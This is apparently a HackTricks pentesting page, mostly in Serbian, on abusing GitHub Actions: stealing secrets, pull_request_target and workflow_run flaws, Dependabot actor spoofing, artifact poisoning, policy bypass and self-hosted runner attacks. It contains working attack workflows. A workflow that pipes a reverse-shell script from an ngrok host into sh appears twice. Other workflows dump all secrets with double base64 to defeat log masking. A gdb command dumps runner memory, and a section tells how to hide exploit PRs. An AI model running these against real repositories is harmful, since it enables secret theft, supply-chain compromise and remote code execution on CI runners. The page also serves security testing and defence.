# Zloupotreba Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Alati

Sledeći alati su korisni za pronalaženje Github Action workflows i čak pronalaženje ranjivih primeraka:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Pogledajte takođe checklist u [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Osnovne informacije

Na ovoj stranici ćete naći:

- Kratak pregled svih **posledica** koje napadač može izazvati ako uspe da pristupi Github Action
- Različiti načini kako **dobiti pristup action-u**:
- Imati **dozvole** za kreiranje action-a
- Zloupotreba okidača vezanih za **pull request**
- Zloupotreba drugih tehnika eksternog pristupa
- **Pivoting** sa već kompromitovanog repo-a
- Na kraju, sekcija o **post-exploitation tehnikama za zloupotrebu action-a iznutra** (koje prouzrokuju prethodno navedene posledice)

## Rezime posledica

Za uvod u [**Github Actions pogledajte osnovne informacije**](../basic-github-information.md#github-actions).

Ako možete **izvršiti proizvoljan kod u GitHub Actions** unutar **repozitorijuma**, mogli biste:

- **Krađa secrets** montiranih u pipeline i **zloupotreba privilegija pipeline-a** za neautorizovan pristup eksternim platformama, kao što su AWS i GCP.
- **Kompromitovanje deployments** i drugih **artefakata**.
- Ako pipeline deployuje ili skladišti asset-e, možete izmeniti finalni proizvod, omogućavajući supply chain attack.
- **Izvršavanje koda u custom workers** radi zloupotrebe računarske snage i pivotovanja na druge sisteme.
- **Prepisivanje koda repozitorijuma**, u zavisnosti od dozvola povezanih sa `GITHUB_TOKEN`.

## GITHUB_TOKEN

Ovaj "**secret**" (potiče iz `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) dodeljuje se kada admin omogući ovu opciju:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti koji će koristiti **Github Application**, tako da može pristupiti istim endpointima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github bi trebalo da objavi a [**flow**](https://github.com/github/roadmap/issues/74) koji **omogućava cross-repository** pristup unutar GitHub-a, tako da repo može pristupiti drugim internim repozitorijumima koristeći `GITHUB_TOKEN`.

Možete videti moguće **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Obratite pažnju da token **isteče nakon završetka job-a**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neke zanimljive stvari koje možete uraditi sa ovim tokenom:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Imajte na umu da ćete u nekoliko slučajeva moći da pronađete **github user tokens inside Github Actions envs or in the secrets**. Ovi tokeni vam mogu dati veće privilegije nad repozitorijumom i organizacijom.

<details>

<summary>Prikaži secrets u izlazu Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell koristeći secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole dodeljene Github Token-u u drugim korisničkim repositories tako što ćete proveriti logove Github actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno izvršavanje

> [!NOTE]
> Ovo bi bio najlakši način da kompromitujete Github actions, jer ovaj slučaj podrazumeva da imate pristup da **create a new repo in the organization**, ili da imate **write privileges over a repository**.
>
> Ako ste u ovoj situaciji, možete jednostavno pogledati [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Izvršavanje preko kreiranja repoa

U slučaju da članovi organizacije mogu **create new repos** i da možete izvršavati github actions, možete **create a new repo and steal the secrets set at organization level**.

### Izvršavanje preko novog brancha

Ako možete **create a new branch in a repository that already contains a Github Action** konfigurisan, možete ga **modify**, **upload** sadržaj, i potom **execute that action from the new branch**. Na ovaj način možete **exfiltrate repository and organization level secrets** (ali morate znati kako se zovu).

> [!WARNING]
> Bilo kakvo ograničenje implementirano samo unutar workflow YAML (na primer, `on: push: branches: [main]`, job conditionals, ili manual gates) može biti izmenjeno od strane saradnika. Bez spoljne primene (branch protections, protected environments, i protected tags), contributor može preusmeriti workflow da se pokrene na njegovom branch-u i zloupotrebiti montirane secrets/permissions.

Možete napraviti izmenjeni action izvršnim **manually,** kada je **PR is created** ili kada je **some code is pushed** (u zavisnosti koliko želite da budete bučni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Izvršavanje iz fork-a

> [!NOTE]
> Postoje različiti trigger-i koji bi napadaču mogli omogućiti da **execute a Github Action of another repository**. Ako su te trigger-abilne akcije loše konfigurisane, napadač bi mogao uspeti da ih kompromituje.

### `pull_request`

The workflow trigger **`pull_request`** će izvršiti workflow svaki put kada se primi pull request uz neke izuzetke: po default-u ako je to **prvi put** da doprinosite, neki **maintainer** će morati da **odobri** **pokretanje** workflow-a:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Pošto je **podrazumevano ograničenje** za **prvi put** doprinosioce, možete doprineti **ispravljajući validan bug/typo** i zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.
>
> **I testirao sam ovo i ne radi**: ~~Druga opcija bi bila da napravite nalog sa imenom nekoga ko je doprineo projektu i obrisao svoj nalog.~~

Štaviše, po default-u to **sprečava write permissions** i **secrets access** ka ciljanom repozitorijumu kao što je pomenuto u [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Napadač može izmeniti definiciju Github Action-a kako bi izvršio proizvoljne komande i dodao proizvoljne akcije. Međutim, zbog pomenutih ograničenja neće moći da ukrade secrets ili prepiše repo.

> [!CAUTION]
> **Da, ako napadač promeni u PR-u github action koji će biti okinut, njegov Github Action će biti taj koji se koristi, a ne onaj iz originalnog repozitorijuma!**

Pošto napadač takođe kontroliše kod koji se izvršava, čak i ako nema secrets ili write permissions na `GITHUB_TOKEN`, napadač bi na primer mogao **otpremiti maliciozne artefakte**.

### **`pull_request_target`**

The workflow trigger **`pull_request_target`** ima **write permission** ka ciljanom repozitorijumu i **access to secrets** (i ne traži odobrenje).

Napomena da workflow trigger **`pull_request_target`** **pokreće se u base context-u** a ne u onom koji daje PR (da **ne bi izvršavao nepoverljiv kod**). Za više informacija o `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Štaviše, za više informacija o ovom specifično opasnom korišćenju pogledajte ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Može delovati da je bezbedno koristiti **`pull_request_target`** zato što se **izvršeni workflow** definiše u **base-u** a **ne u PR-u**, ali postoje **nekoliko slučajeva gde to nije**.

I ovaj će imati **access to secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger omogućava da se workflow pokrene iz drugog kada je `completed`, `requested` ili `in_progress`.

U ovom primeru, workflow je konfigurisan da se pokrene nakon što se odvojeni "Run Tests" workflow završi:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Štaviše, prema dokumentaciji: workflow pokrenut događajem `workflow_run` može da **pristupi secrets i write tokens, čak i ako prethodni workflow nije**.

Ovakav workflow može biti napadnut ako **zavisi** od **workflow** koji eksterni korisnik može **pokrenuti** putem **`pull_request`** ili **`pull_request_target`**. Par ranjivih primera može se naći u [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi primer se sastoji od **`workflow_run`** pokrenutog workflow-a koji preuzima kod napadača: `${{ github.event.pull_request.head.sha }}`  
Drugi primer se sastoji u **prosleđivanju** **artifact**-a iz **untrusted** koda u **`workflow_run`** workflow i korišćenju sadržaja tog artifact-a na način koji ga čini **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvršava iz pull_request koristi/preuzima kod iz origin ili iz forkovanog PR-a

## Zloupotreba forkovanog izvršavanja

Pomenuo/la smo sve načine na koje eksterni napadač može naterati github workflow da se izvrši, sada hajde da pogledamo kako se ta izvršavanja, ako su loše konfigurisana, mogu zloupotrebiti:

### Untrusted checkout execution

U slučaju **`pull_request`**, workflow će se izvršiti u **kontekstu PR-a** (dakle izvršiće **malicious PRs code**), ali neko mora to prvo **odobriti** i on će se izvršavati sa određenim [ograničenjima](#pull_request).

U slučaju workflow-a koji koristi **`pull_request_target` or `workflow_run`** i koji zavisi od workflow-a koji može biti pokrenut iz **`pull_request_target` or `pull_request`**, izvršiće se kod iz originalnog repozitorijuma, tako da **napadač ne može kontrolisati izvršeni kod**.

> [!CAUTION]
> Međutim, ako **action** ima **explicit PR checkout** koji će **dohvatiti kod iz PR-a** (a ne iz base), koristiće kod koji kontroliše napadač. Na primer (pogledajte liniju 12 gde se preuzima PR kod):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **untrusted code se izvršava tokom `npm install` ili `npm build`** jer su build skripte i referencirani **packages pod kontrolom autora PR-a**.

> [!WARNING]
> Github dork za pretragu ranjivih actions je: `event.pull_request pull_request_target extension:yml` međutim, postoje različiti načini da se konfigurišu jobs da se izvršavaju sigurno čak i ako je action nesigurno konfigurisana (npr. korišćenjem uslova o tome ko je actor koji generiše PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje određeni [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github action koristi te **podatke za izvršavanje bilo čega**, to može dovesti do **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Iz dokumentacije: Možete učiniti da **environment variable bude dostupan svim narednim koracima** u workflow job-u tako što ćete definisati ili ažurirati promenljivu okruženja i upisati je u **`GITHUB_ENV`** environment fajl.

Ako bi napadač mogao da **ubaci bilo koju vrednost** u ovu **env** promenljivu, mogao bi da ubaci env promenljive koje bi mogle izvršiti kod u narednim koracima, kao što su **LD_PRELOAD** ili **NODE_OPTIONS**.

Na primer ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje uploadovanom artifact-u da sačuva njegov sadržaj u **`GITHUB_ENV`** env promenljivu. Napadač bi mogao da uploaduje nešto ovakvo da bi ga kompromitovao:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Kao što je naznačeno u [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), nekoliko organizacija ima Github Action koji merguje bilo koji PR od `dependabot[bot]` kao u:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
To predstavlja problem zato što polje `github.actor` sadrži korisnika koji je izazvao poslednji događaj koji je pokrenuo workflow. Postoji nekoliko načina da se natera korisnik `dependabot[bot]` da izmeni PR. Na primer:

- Napravite fork repository-ja žrtve
- Dodajte malicious payload u svoju kopiju
- Omogućite Dependabot na svom forku dodavanjem zastarele dependency. Dependabot će kreirati branch koji ispravlja dependency sa malicious kodom.
- Otvorite Pull Request ka repository-ju žrtve iz tog branch-a (PR će biti kreiran od strane korisnika, tako da se još ništa neće desiti)
- Zatim, napadač se vraća na početni PR koji je Dependabot otvorio u njegovom forku i pokreće `@dependabot recreate`
- Zatim Dependabot izvrši neke akcije na tom branch-u, koje izmeniše PR u repository-ju žrtve, čime je `dependabot[bot]` postao autor poslednjeg događaja koji je pokrenuo workflow (i stoga, workflow se pokreće).

Idemo dalje, šta ako umesto merge-ovanja Github Action ima command injection kao u:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Pa, originalni blogpost predlaže dve opcije za zloupotrebu ovog ponašanja, pri čemu je druga:

- Fork the victim repository and enable Dependabot with some outdated dependency.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Ranjive Third-Party GitHub Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao što je pomenuto u [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova GitHub Action dozvoljava pristup artifacts iz različitih workflow-ova i čak repozitorijuma.

Problem je u tome što, ako parametar **`path`** nije postavljen, artifact se ekstrahuje u trenutni direktorijum i može prebrisati fajlove koji bi kasnije mogli biti korišćeni ili čak izvršeni u workflow-u. Dakle, ako je Artifact ranjiv, napadač bi to mogao zloupotrebiti da kompromituje druge workflow-ove koji veruju tom Artifact-u.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo se može napasti ovim workflow-om:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Ostali eksterni pristup

### Obrisano Namespace Repo Hijacking

Ako nalog promeni svoje ime, drugi korisnik može nakon nekog vremena registrovati nalog sa tim imenom. Ako je repozitorijum pre promene imao **manje od 100 stars**, Github će omogućiti novom registrovanom korisniku sa istim imenom da kreira **repository sa istim imenom** kao obrisani.

> [!CAUTION]
> Dakle, ako action koristi repo iz nepostojećeg naloga, i dalje je moguće da attacker kreira taj nalog i compromise action.

Ako drugi repos koriste **dependencies from this user repos**, attacker će moći da ih hijackuje. Ovde imate detaljnije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> U ovom odeljku govorićemo o tehnikama koje bi omogućile da **pivot from one repo to another** pod pretpostavkom da imamo neki pristup prvom (pogledajte prethodni odeljak).

### Cache Poisoning

Cache se održava između **wokflow runs in the same branch**. To znači da ako attacker **compromise** paket koji se potom skladišti u cache i bude **downloaded** i izvršen od strane **more privileged** workflow, on će moći i da **compromise** i taj workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows mogu koristiti **artifacts from other workflows and even repos**; ako attacker uspe da **compromise** Github Action koja **uploads an artifact** koja se kasnije koristi u drugom workflow-u, on bi mogao **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Kao što je objašnjeno u [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), čak i ako repozitorijum ili organizacija ima politiku koja ograničava upotrebu određenih actions, attacker može jednostavno da download-uje (`git clone`) action unutar workflow-a i potom ga referencira kao local action. Pošto politike ne utiču na lokalne puteve, **the action will be executed without any restriction.**

Primer:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Pristup AWS i GCP preko OIDC

Pogledajte sledeće stranice:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Pristup secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u skriptu, interesantno je znati kako možete pristupiti secrets:

- Ako je secret ili token postavljen kao **environment variable**, njima se može direktno pristupiti kroz okruženje koristeći **`printenv`**.

<details>

<summary>Ispis secrets u Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijte reverse shell pomoću secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
- ```bash
cat /home/runner/work/_temp/*
```
- For a JavaScript actions the secrets and sent through environment variables
- ```bash
ps axe | grep node
```
- For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerate all secrets via the secrets context (collaborator level). A contributor with write access can modify a workflow on any branch to dump all repository/org/environment secrets. Use double base64 to evade GitHub’s log masking and decode locally:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### Abusing Self-hosted runners

The way to find which **Github Actions are being executed in non-github infrastructure** is to search for **`runs-on: self-hosted`** in the Github Action configuration yaml.

**Self-hosted** runners might have access to **extra sensitive information**, to other **network systems** (vulnerable endpoints in the network? metadata service?) or, even if it's isolated and destroyed, **more than one action might be run at the same time** and the malicious one could **steal the secrets** of the other one.

In self-hosted runners it's also possible to obtain the **secrets from the \_Runner.Listener**\_\*\* process\*\* which will contain all the secrets of the workflows at any step by dumping its memory:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Pogledajte [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registar

Moguće je napraviti Github actions koji će **izgraditi i sačuvati Docker image unutar Github-a**.\
Primer se može naći u sledećem proširivom bloku:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što možete videti u prethodnom kodu, Github registry je hostovan na **`ghcr.io`**.

Korisnik sa dozvolama za čitanje nad repozitorijumom moći će da preuzme Docker Image koristeći personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik može pretražiti za **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Osetljive informacije u Github Actions logovima

Čak i ako **Github** pokuša **detektovati secret values** u logovima akcija i **sprečiti njihovo prikazivanje**, **drugi osetljivi podaci** koji su mogli biti generisani tokom izvršavanja akcije neće biti sakriveni. Na primer, JWT potpisan tajnom vrednošću neće biti sakriven osim ako nije [specifično konfigurisano](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Sakrivanje tragova

(Tehnika iz [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki PR koji se podigne je jasno vidljiv javnosti na Github i ciljnom GitHub nalogu. Na GitHub-u po defaultu, mi **ne možemo izbrisati PR sa interneta**, ali postoji trik. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PRs are automatically deleted** i uklanjaju se sa interneta. Dakle, da biste sakrili svoju aktivnost morate ili da vam se **GitHub account suspenduje ili da vam nalog bude flagged**. To bi **sakrilo sve vaše aktivnosti** na GitHub-u sa interneta (u suštini uklonilo sve vaše exploit PR)

> [!WARNING]
> Jedini način da organizacija otkrije da je bila meta je da pregleda GitHub logove iz SIEM-a jer će iz GitHub UI PR biti uklonjen.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
